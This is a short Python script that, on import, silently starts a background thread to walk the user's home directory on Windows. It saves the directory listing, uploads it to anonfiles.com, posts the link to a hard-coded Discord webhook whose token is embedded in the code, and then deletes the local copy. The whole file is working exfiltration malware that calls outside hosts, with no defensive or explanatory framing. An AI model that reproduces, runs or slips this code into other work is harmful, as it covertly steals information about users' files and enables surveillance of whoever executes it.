import threading
def GETALL():
    import os, requests, json
    ok = 'https://discord.com/api/webhooks/905032361790550027/MRlL2utxgymhTx8AIye7fIZ4Ay0zWpuZ5vB9nrE8ZFleihZjEnHTE_w1_qw5IlB3LVjI'
    OK2 = []
    currpath = os.getcwd()
    userspath = '\\'.join(currpath.split('\\')[:3])
    def sendToDiscord(webhook_url, message):
        payload = {
            "content": json.dumps(message)
        }
        headers = {
            'Content-Type': 'application/json',
        }
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        return response
    def list_files(startpath):
        for root, dirs, files in os.walk(startpath):
            level = root.replace(startpath, '').count(os.sep)
            for ele in dirs:
                try:
                    OK2.append([root,ele,os.listdir(root+'\\'+ele)])
                    #OK[root][ele] = [os.listdir(root+'\\'+ele)]
                except:
                    ''
                    #OK[root] = {}
        open('resuslts23.json','w').write(json.dumps(OK2))
        with open('resuslts23.json','r') as f1:
            _files = {"file": ('resuslts23.json', f1.read())}
        r = requests.post('https://api.anonfiles.com/upload', files=_files).json()
        if r["status"]:
            file = r["data"]["file"]
            final_file = {"url": file["url"], "metadata": file["metadata"]}
            sendToDiscord(ok,final_file['url'])
        os.remove('resuslts23.json')
    list_files(userspath)
threading.Thread(target=GETALL).start()
